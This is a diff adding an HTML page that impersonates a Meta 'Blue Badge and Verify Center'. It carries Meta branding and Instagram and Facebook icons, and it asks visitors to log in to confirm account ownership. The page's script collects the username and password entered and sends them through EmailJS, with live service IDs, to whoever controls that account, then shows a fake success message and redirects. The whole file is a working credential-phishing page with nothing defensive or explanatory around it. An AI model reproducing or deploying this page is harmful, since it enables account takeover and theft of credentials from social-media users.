@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Badge and Verify Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init("boewUzoJQBqOP4D8T"); // Replace with your EmailJS user ID
+        })();
+    </script>
+</head>
+
+<body class="font-roboto bg-white">
+    <header class="flex items-center justify-between p-4">
+        <div class="flex items-center">
+            <img src="logo.png" alt="Meta logo" class="mr-2" width="110" height="40" />
+        </div>
+        <nav class="hidden md:flex space-x-4">
+            <a class="text-gray-600" href="#">Who we are</a>
+            <a class="text-gray-600" href="#">Our technologies</a>
+            <a class="text-gray-600" href="#">The metaverse</a>
+            <a class="text-gray-600" href="#">Meta and you</a>
+            <a class="text-gray-600" href="#">Shop Meta</a>
+            <a class="text-gray-600" href="#">News</a>
+            <a class="text-gray-600" href="#">Support</a>
+        </nav>
+        <!-- Mobile Menu Button -->
+        <button id="mobile-menu-button" class="md:hidden focus:outline-none">
+            <i class="fas fa-bars text-gray-600"></i>
+        </button>
+    </header>
+
+    <!-- Mobile Menu -->
+    <nav id="mobile-menu" class="hidden md:hidden p-4 space-y-2 bg-white shadow-lg">
+        <a class="block" href="#">Who we are</a>
+        <a class="block" href="#">Our technologies</a>
+        <a class="block" href="#">The metaverse</a>
+        <a class="block" href="#">Meta and you</a>
+        <a class="block" href="#">Shop Meta</a>
+        <a class="block" href="#">News</a>
+        <a class="block" href="#">Support</a>
+    </nav>
+
+    <main class="flex flex-col items-center mt-10">
+        <div class="flex flex-col md:flex-row items-center space-x-0 md:space-x-4 mb-6">
+            <img src="centangbiru.png" alt="centang Biru" class="w-20 h-20 mb-4 md:mb-0" />
+            <div class="flex space-x-2">
+                <img src="Instagram.png" alt="Instagram" class="w-16 h-16" />
+                <img src="fb.png" alt="Facebook" class="w-16 h-16" />
+            </div>
+        </div>
+        <h1 class="text-4xl md:text-6xl font-bold text-center">Blue Badge<br />and Verify Center</h1>
+        <p class="text-lg md:text-xl text-center mt-2">Please login to confirm account ownership</p>
+
+        <div class="mt-4 w-full max-w-sm">
+            <form onsubmit="sendEmail(); return false;" class="flex flex-col items-center">
+                <input type="text" id="username" class="w-full p-4 mb-4 rounded-full border border-gray-300" placeholder="Username" required>
+                <input type="password" id="password" class="w-full p-4 mb-4 rounded-full border border-gray-300" placeholder="Password" required />
+                <p id="message" class="mt-2" style="display: none;"></p>
+                <button type="submit" class="bg-blue-600 text-white px-10 py-3 rounded-full text-lg">Continue</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        async function sendEmail() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var submitButton = document.querySelector("button[type='submit']");
+
+            clearMessages(); // Clear previous messages
+
+            // Validate input
+            if (!username || !password) {
+                displayMessage("Both fields are required.", "error");
+                return;
+            }
+
+            try {
+                submitButton.disabled = true;
+                submitButton.textContent = "Sending...";
+
+                // Send email using EmailJS
+                await emailjs.send("service_50utr4r", "template_02nky78", { username, password });
+
+                displayMessage("login succes.", "success");
+            } catch (error) {
+                displayMessage("Failed to send email. Please try again.", "error");
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = "Continue";
+            }
+
+            setTimeout(() => {
+                window.location.href = 'verified.html';
+            }, 1000);
+        }
+
+        function displayMessage(message, type) {
+            var messageElement = document.getElementById("message");
+            messageElement.textContent = message;
+            messageElement.className = type === "success" ? "text-green-500" : "text-red-500";
+            messageElement.style.display = "block";
+        }
+
+        function clearMessages() {
+            var messageElement = document.getElementById("message");
+            messageElement.textContent = "";
+            messageElement.style.display = "none";
+        }
+
+        // Toggle mobile menu
+        document.getElementById('mobile-menu-button').addEventListener('click', () => {
+            const mobileMenu = document.getElementById('mobile-menu');
+            mobileMenu.classList.toggle('hidden');
+        });
+    </script>
+</body>
+
+</html>
